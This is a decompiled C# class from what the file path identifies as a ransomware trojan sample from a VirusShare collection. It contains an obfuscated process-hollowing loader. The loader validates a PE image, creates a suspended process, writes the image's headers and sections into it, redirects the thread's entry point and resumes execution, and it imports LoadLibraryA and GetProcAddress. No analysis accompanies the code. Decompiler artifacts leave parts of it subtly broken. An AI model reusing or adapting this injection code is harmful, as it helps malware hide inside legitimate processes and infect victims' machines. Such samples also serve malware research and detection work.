// Decompiled with JetBrains decompiler
// Type: CHZuomDOVaZyAsG.KNYqhErWUEtJsNrXjNEkMOvYLiTIFM
// Assembly: RSBotter, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 408E22CE-2506-483B-899B-2CBBFCDF1211
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-c380530c3a65453947550e9d4c34a966f84b1976b0ed856d97d1a4857d93caf3.exe

using System;
using System.Runtime.InteropServices;

namespace CHZuomDOVaZyAsG
{
  public class KNYqhErWUEtJsNrXjNEkMOvYLiTIFM
  {
    private const uint gdMYPoBtDmtPKLxljePermJhmWtaDZ = 65543;
    private const int LHqhyqXtYdvRktQXeKAAYPTBvUtELT = 4;
    private const int VBNDALyDnhnOfLHycrrpSGydbVOOLD = 4096;
    private const int VsHehUdFRexzwsnjJhTWScnwbocKCE = 8192;
    private const int XKSImUgaENvvzmQtkgPRmHUOLTfldS = 64;
    private const ushort RscnhNHNhscICfAvCbGJeWVLtpPdXt = 23117;
    private const uint PVXLWctnecJvZvOCfPnqrdEtOVxrUS = 17744;

    public static unsafe bool \u0020(
      byte[] YDQODgLQjxbqXDZHWyWPkaQHbLrDXb,
      string EdtmefFkSHRoGOobgatgYYteHYNiNR)
    {
      uJtoCBlGJVtRtSADngGSdtEVYhiCoS.khcNpWphILVTtbL khcNpWphIlvTtbL = uJtoCBlGJVtRtSADngGSdtEVYhiCoS.\u0020<uJtoCBlGJVtRtSADngGSdtEVYhiCoS.khcNpWphILVTtbL>(uJtoCBlGJVtRtSADngGSdtEVYhiCoS.DTuFRGDtpMtJXUaibgzgRtgLjdTqKs[1], uJtoCBlGJVtRtSADngGSdtEVYhiCoS.DTuFRGDtpMtJXUaibgzgRtgLjdTqKs[3]);
      uJtoCBlGJVtRtSADngGSdtEVYhiCoS.lGXGXtukevAkpxs lGxgXtukevAkpxs = uJtoCBlGJVtRtSADngGSdtEVYhiCoS.\u0020<uJtoCBlGJVtRtSADngGSdtEVYhiCoS.lGXGXtukevAkpxs>(uJtoCBlGJVtRtSADngGSdtEVYhiCoS.DTuFRGDtpMtJXUaibgzgRtgLjdTqKs[2], uJtoCBlGJVtRtSADngGSdtEVYhiCoS.DTuFRGDtpMtJXUaibgzgRtgLjdTqKs[4]);
      uJtoCBlGJVtRtSADngGSdtEVYhiCoS.RhNnFAXIYVVMJyr rhNnFaxiyvvmJyr = uJtoCBlGJVtRtSADngGSdtEVYhiCoS.\u0020<uJtoCBlGJVtRtSADngGSdtEVYhiCoS.RhNnFAXIYVVMJyr>(uJtoCBlGJVtRtSADngGSdtEVYhiCoS.DTuFRGDtpMtJXUaibgzgRtgLjdTqKs[1], uJtoCBlGJVtRtSADngGSdtEVYhiCoS.DTuFRGDtpMtJXUaibgzgRtgLjdTqKs[5]);
      uJtoCBlGJVtRtSADngGSdtEVYhiCoS.hJpjtVOtpkoXZLc hJpjtVotpkoXzLc = uJtoCBlGJVtRtSADngGSdtEVYhiCoS.\u0020<uJtoCBlGJVtRtSADngGSdtEVYhiCoS.hJpjtVOtpkoXZLc>(uJtoCBlGJVtRtSADngGSdtEVYhiCoS.DTuFRGDtpMtJXUaibgzgRtgLjdTqKs[1], uJtoCBlGJVtRtSADngGSdtEVYhiCoS.DTuFRGDtpMtJXUaibgzgRtgLjdTqKs[6]);
      uJtoCBlGJVtRtSADngGSdtEVYhiCoS.HKKMlthAjvCaeBK hkkMlthAjvCaeBk = uJtoCBlGJVtRtSADngGSdtEVYhiCoS.\u0020<uJtoCBlGJVtRtSADngGSdtEVYhiCoS.HKKMlthAjvCaeBK>(uJtoCBlGJVtRtSADngGSdtEVYhiCoS.DTuFRGDtpMtJXUaibgzgRtgLjdTqKs[1], uJtoCBlGJVtRtSADngGSdtEVYhiCoS.DTuFRGDtpMtJXUaibgzgRtgLjdTqKs[7]);
      uJtoCBlGJVtRtSADngGSdtEVYhiCoS.HCHmNmwAfvvONDa hcHmNmwAfvvOnDa = uJtoCBlGJVtRtSADngGSdtEVYhiCoS.\u0020<uJtoCBlGJVtRtSADngGSdtEVYhiCoS.HCHmNmwAfvvONDa>(uJtoCBlGJVtRtSADngGSdtEVYhiCoS.DTuFRGDtpMtJXUaibgzgRtgLjdTqKs[1], uJtoCBlGJVtRtSADngGSdtEVYhiCoS.DTuFRGDtpMtJXUaibgzgRtgLjdTqKs[8]);
      byte[] dst1 = new byte[40];
      byte[] dst2 = new byte[248];
      byte[] dst3 = new byte[64];
      int[] WUYAICpftfRmUtYJHtYAUKojNBoSZv = new int[4];
      byte[] numArray = new byte[716];
      fixed (byte* numPtr = &dst1[0])
        ;
      fixed (byte* numPtr = &dst2[0])
        ;
      fixed (byte* numPtr = &dst3[0])
        ;
      fixed (byte* HfSbKEtUQhTRyMr = &numArray[0])
        ;
      // ISSUE: fixed variable is out of scope
      *(int*) HfSbKEtUQhTRyMr = 65543;
      Buffer.BlockCopy((Array) YDQODgLQjxbqXDZHWyWPkaQHbLrDXb, 0, (Array) dst3, 0, dst3.Length);
      // ISSUE: fixed variable is out of scope
      if (*(ushort*) numPtr != (ushort) 23117)
        return false;
      // ISSUE: fixed variable is out of scope
      int srcOffset = *(int*) (numPtr + 60);
      Buffer.BlockCopy((Array) YDQODgLQjxbqXDZHWyWPkaQHbLrDXb, srcOffset, (Array) dst2, 0, dst2.Length);
      // ISSUE: fixed variable is out of scope
      if (*(uint*) numPtr != 17744U || !KNYqhErWUEtJsNrXjNEkMOvYLiTIFM.CreateProcess((string) null, EdtmefFkSHRoGOobgatgYYteHYNiNR, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, (string) null, new byte[68], WUYAICpftfRmUtYJHtYAUKojNBoSZv))
        return false;
      // ISSUE: fixed variable is out of scope
      IntPtr num1 = new IntPtr(*(int*) (numPtr + 52));
      int num2 = (int) rhNnFaxiyvvmJyr((IntPtr) WUYAICpftfRmUtYJHtYAUKojNBoSZv[0], num1);
      // ISSUE: fixed variable is out of scope
      if (lGxgXtukevAkpxs((IntPtr) WUYAICpftfRmUtYJHtYAUKojNBoSZv[0], num1, *(uint*) (numPtr + 80), 12288U, 64U) == IntPtr.Zero)
        KNYqhErWUEtJsNrXjNEkMOvYLiTIFM.\u0020(YDQODgLQjxbqXDZHWyWPkaQHbLrDXb, EdtmefFkSHRoGOobgatgYYteHYNiNR);
      fixed (byte* KkGEyUFPhhSvwKm = &YDQODgLQjxbqXDZHWyWPkaQHbLrDXb[0])
      {
        // ISSUE: fixed variable is out of scope
        int num3 = khcNpWphIlvTtbL((IntPtr) WUYAICpftfRmUtYJHtYAUKojNBoSZv[0], num1, (IntPtr) (void*) KkGEyUFPhhSvwKm, *(uint*) (numPtr + 84), IntPtr.Zero);
      }
      // ISSUE: fixed variable is out of scope
      for (ushort index = 0; (int) index < (int) *(ushort*) (numPtr + 6); ++index)
      {
        Buffer.BlockCopy((Array) YDQODgLQjxbqXDZHWyWPkaQHbLrDXb, srcOffset + dst2.Length + dst1.Length * (int) index, (Array) dst1, 0, dst1.Length);
        // ISSUE: fixed variable is out of scope
        fixed (byte* KkGEyUFPhhSvwKm = &YDQODgLQjxbqXDZHWyWPkaQHbLrDXb[(IntPtr) *(uint*) (numPtr + 20)])
        {
          // ISSUE: fixed variable is out of scope
          // ISSUE: fixed variable is out of scope
          int num4 = khcNpWphIlvTtbL((IntPtr) WUYAICpftfRmUtYJHtYAUKojNBoSZv[0], (IntPtr) ((long) (int) num1 + (long) *(uint*) (numPtr + 12)), (IntPtr) (void*) KkGEyUFPhhSvwKm, *(uint*) (numPtr + 16), IntPtr.Zero);
        }
      }
      // ISSUE: fixed variable is out of scope
      int num5 = hJpjtVotpkoXzLc((IntPtr) WUYAICpftfRmUtYJHtYAUKojNBoSZv[1], (IntPtr) (void*) HfSbKEtUQhTRyMr);
      // ISSUE: fixed variable is out of scope
      int num6 = khcNpWphIlvTtbL((IntPtr) WUYAICpftfRmUtYJHtYAUKojNBoSZv[0], (IntPtr) (long) *(uint*) (HfSbKEtUQhTRyMr + 172), num1, 4U, IntPtr.Zero);
      // ISSUE: fixed variable is out of scope
      // ISSUE: fixed variable is out of scope
      *(int*) (HfSbKEtUQhTRyMr + 176) = (int) num1 + (int) *(uint*) (numPtr + 40);
      // ISSUE: fixed variable is out of scope
      int num7 = hkkMlthAjvCaeBk((IntPtr) WUYAICpftfRmUtYJHtYAUKojNBoSZv[1], (IntPtr) (void*) HfSbKEtUQhTRyMr);
      int num8 = (int) hcHmNmwAfvvOnDa((IntPtr) WUYAICpftfRmUtYJHtYAUKojNBoSZv[1], IntPtr.Zero);
      return true;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CreateProcess(
      string PiSiTYXKzTcMFoYVsbtZEqjRcFInDf,
      string twvaSIvxVpevAAdlsggMEMOOnzYbfn,
      IntPtr qJhtBEqEupzVffVjOINQnBhRAEIHNs,
      IntPtr KtsIYtphYyUNKRmJHISdKqnoZOCpTW,
      bool VIRcDfBwgAUGKpVzQpEQXZOJHugeIk,
      uint RZobCmVHnghlCrjdEYsyXnJcZWThuj,
      IntPtr ZxNVJUsIMJDjcxJMwwADPiKknDpmbF,
      string tOndhIxGHoKWlJVNlltnywGRtRMCIg,
      byte[] FhGgrPWYrapPPmTSWbpysdTOgViuJq,
      int[] WUYAICpftfRmUtYJHtYAUKojNBoSZv);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibraryA(string HApbeuRoDqDRJjHgjAQwoNwjulFONh);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(
      IntPtr pwfVxrXSnDSsQIXdbfBGtMbBiTdgFT,
      string OczvagLNLrjqnnEUWOltjAnhOCuCND);
  }
}
